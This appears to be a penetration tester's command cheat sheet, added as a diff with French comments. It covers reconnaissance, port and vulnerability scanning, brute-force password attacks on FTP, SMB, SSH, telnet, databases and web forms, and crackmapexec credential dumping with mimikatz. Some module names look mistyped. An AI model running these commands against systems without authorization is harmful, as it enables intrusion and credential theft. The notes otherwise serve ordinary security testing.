@@ -1,0 +1,267 @@
+########################## PHASE DE RECONNAISSANCE #######################################################
+############# PASSIVE ####################################################################################
+
+# nslookup 
+nslookup URL
+nslookup -type=A URL
+nslookup -type=MX URL
+nslookup -type=TXT URL
+
+# Dig
+dig URL
+dig URL MX
+dig URL A
+dig URL TXT
+
+# Host command
+host URL 
+host -a URL
+
+# Whois
+whois URL
+whois IP_ADDRESS 
+
+# wafw00f 
+wafw00f URL
+
+# whatweb
+whatweb URL 
+
+# dnsrecon
+dnsrecon -d URL
+dnsrecon -d URL -a
+dnsrecon -d URL -D /usr/share/wordlists/amass/all.txt -t brt
+
+
+########################## PHASE DE RECONNAISSANCE #######################################################
+############# ACTIVE #####################################################################################
+
+# Ping
+ping -c 5 IP_ADDRESS
+ping -c 5 URL
+
+# Fping
+fping -g IP_ADDRESS/24
+
+# TracerouteURL
+traceroute URL
+ 
+# TracerouteIP
+traceroute IP_ADDRESS
+
+############# ACTIVE ####################################################################################
+########################## TESTS SSL ####################################################################
+
+# testssl
+testssl URL
+
+# sslscan
+sslscan URL
+
+# sslyze
+sslyze URL
+
+############# ACTIVE ####################################################################################
+########################## SCAN DE PORTS ################################################################
+
+# Nmap classique
+nmap IP_ADDRESS -p-
+
+# Nmap ports communs
+nmap -Pn -n --open -sCV --top-ports 2000 IP_ADDRESS
+
+# Nmap range ip       
+nmap -PEPM -sP -n IP_ADDRESS/24
+
+# Nmap scan OS, services
+nmap -Pn -sV -A IP_ADDRESS
+
+# Nmap scan script
+nmap -Pn -sC IP_ADDRESS
+
+#masscan to scan top20ports range 
+masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 IP_ADDRESS/24
+
+########################## OSINT ########################################################################
+#########################################################################################################
+
+# Spiderfoot
+spiderfoot -s URL
+
+########################## RECHERCHE DE VULNERABILITES ####################################################
+########################## SCAN DE VULN ###################################################################
+
+# Nmap vulnerability
+nmap -Pn -sV --script vuln IP_ADDRESS
+
+# Unix-Privesc-Check
+unix-privesc-check standard IP_ADDRESS
+
+# nikto
+nikto -h IP_ADDRESS
+
+########################## RECHERCHE DE VULNERABILITES ####################################################
+########################## WEB ############################################################################
+
+# HTTRACK
+httrack https://URL
+Y
+
+# Curl
+curl -i URL
+
+# Nmap detect waf 
+nmap --script=http-waf-fingerprint URL
+
+# Wapiti
+wapiti -u https://URL
+
+# waybackurls # à installer sur la machine
+# waybackurls https://URL
+# flemme
+
+# theHarvester
+theHarvester -d URL -l 10 -b all
+
+# ffuf
+ffuf -u https://URL -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt 
+ffuf -u https://URL -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -c -s
+
+# gobuster 
+gobuster dir -u https://URL -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
+
+# Sublist3r
+sublist3r --domain URL
+
+# Dirb
+dirb https://URL
+
+# Wpscan WORDPRESS SCAN 
+wpscan --url URL --verbose
+
+########################## RECHERCHE DE VULNERABILITES ####################################################
+########################## TESTS SNMP #####################################################################
+
+# Snmpcheck
+snmp-check IP_ADDRESS
+
+########################## RECHERCHE DE VULNERABILITES ####################################################
+########################## TESTS SMB ######################################################################
+
+# Nmap smb Discover
+nmap -p445 --script smb-protocols IP_ADDRESS
+
+# enum4linux smb Discover
+enum4linux -U -o IP_ADDRESS
+
+# nbtscan 
+nbtscan IP_ADDRESS/24
+
+# SMBmap
+smbmap -u guest -p "" -d . -H IP_ADDRESS
+
+########################## RECHERCHE DE VULNERABILITES ####################################################
+########################## TESTS DATABASE #################################################################
+
+# Sqlmap 
+sqlmap -a -u URL  
+
+########################## PASSWORD ATTACK ################################################################
+########################## TESTS PASSWORD #################################################################
+########################## FTP SERVER #####################################################################
+# hydra FTP x liste d'user
+hydra -t 1 -V -f -l admin -P /usr/share/wordlists/rockyou.txt IP_ADDRESS ftp
+
+# Medusa
+medusa -h IP_ADDRESS -u admin -P /usr/share/wordlists/rockyou.txt -M ftp
+
+# ncrack
+ncrack -p 21 --user root -P /usr/share/wordlists/rockyou.txt IP_ADDRESS
+
+########################## SMB SERVER #####################################################################
+# hydra SMB x liste d'user
+hydra -t 1 -V -f -l admin -P /usr/share/wordlists/rockyou.txt IP_ADDRESS smb
+
+# Medusa
+medusa -h IP_ADDRESS -u admin -P /usr/share/wordlists/rockyou.txt -M smbnt
+
+
+########################## SMTP SERVER ####################################################################
+# hydra SMTP x liste d'user
+hydra -t 1 -V -f -l admin -P /usr/share/wordlists/rockyou.txt IP_ADDRESS smsmtp
+
+# Medusa
+medusa -h IP_ADDRESS -u admin -P /usr/share/wordlists/rockyou.txt -M snmtp
+
+
+########################## MYSQL SERVER ####################################################################
+# hydra MYSQL (voir si c'est l'url ou l'ip dans les paramètres)
+hydra -t 1 -V -f -L /usr/share/wordlists/others/names.txt -P /usr/share/wordlists/rockyou.txt URL mysql
+
+# Medusa
+medusa -h IP_ADDRESS -u admin -P /usr/share/wordlists/rockyou.txt -M mssql
+
+########################## SNMP SERVER #####################################################################
+# hydra SNMP
+# hydra -P /usr/share/wordlists/rockyou.txt -v IP_ADDRESS snmp
+
+# Medusa
+medusa -h IP_ADDRESS -u admin -P /usr/share/wordlists/rockyou.txt -M snmp
+
+
+########################## SSH #############################################################################
+# hydra SSH
+hydra -v -V -u -L /usr/share/wordlists/others/names.txt -P /usr/share/wordlists/rockyou.txt -t 1 -u IP_ADDRESS ssh
+
+# Medusa
+medusa -h IP_ADDRESS -u admin -P /usr/share/wordlists/rockyou.txt -M ssh
+
+# ncrack
+ncrack -p 22 --user root -P passwords.txt IP_ADDRESS [-T 5]
+
+########################## GET AND POST METHODS ############################################################
+# hydra HTTP methods x liste d'user # command à tester
+hydra -l admin -P /usr/share/wordlists/rockyou.txt URL http-get-form "/<login URL>?<login form data>:<error message>"
+hydra -l admin -P /usr/share/wordlists/rockyou.txt URL http-post-form "/<login URL>?<login form data>:<error message>"
+
+# Medusa (Chemin à changer)
+medusa -h IP_ADDRESS -u admin -P /usr/share/wordlists/rockyou.txt -M  http -m DIR:(/path/to/auth) -T 10
+
+########################## LDAP ###########################################################################
+# Nmap LDAP BF
+nmap --script ldap-brute -p 389 IP_ADDRESS
+
+########################## TELNET #########################################################################
+# hydra
+hydra -l root -P /usr/share/wordlists/rockyou.txt -t 32 IP_ADDRESS telnet
+
+# ncrack
+ncrack -p 23 --user root -P /usr/share/wordlists/rockyou.txt IP_ADDRESS -T 5
+
+# Medusa
+medusa -u root -P /usr/share/wordlists/rockyou.txt -h IP_ADDRESS -M telnet
+
+########################## EXPLOITATION ###################################################################
+###########################################################################################################
+# PwnXSS à installer
+python3 PwnXSS/pwnxss.py -u https://URL
+
+# Fuxploider à installer x étudier
+cd /fuxploider
+python3 fuxploider.py --url https://URL --not-regex "wrong file type"
+
+
+# crackmapexec
+crackmapexec IP_ADDRESS -u 'Administrator' -p 'PASS' --lusers
+crackmapexec IP_ADDRESS -u 'Administrator' -p 'PASSWORD' --local-auth
+crackmapexec IP_ADDRESS -u 'Administrator' -p 'PASS' --rid-brute
+crackmapexec IP_ADDRESS -u 'Administrator' -p 'PASS' --local-auth --sam
+crackmapexec IP_ADDRESS/24 -u ‘admin’ -p ‘P@ssw0rd’
+sudo cme IP_ADDRESS -u 'Administrator' -p 'PASS' --local-auth -M mimikatz
+
+# Mimikatz x Metasploit x Searchsploit
+
+
+########################## POST EXPLOITATION ##############################################################
+###########################################################################################################
+# Beroot 
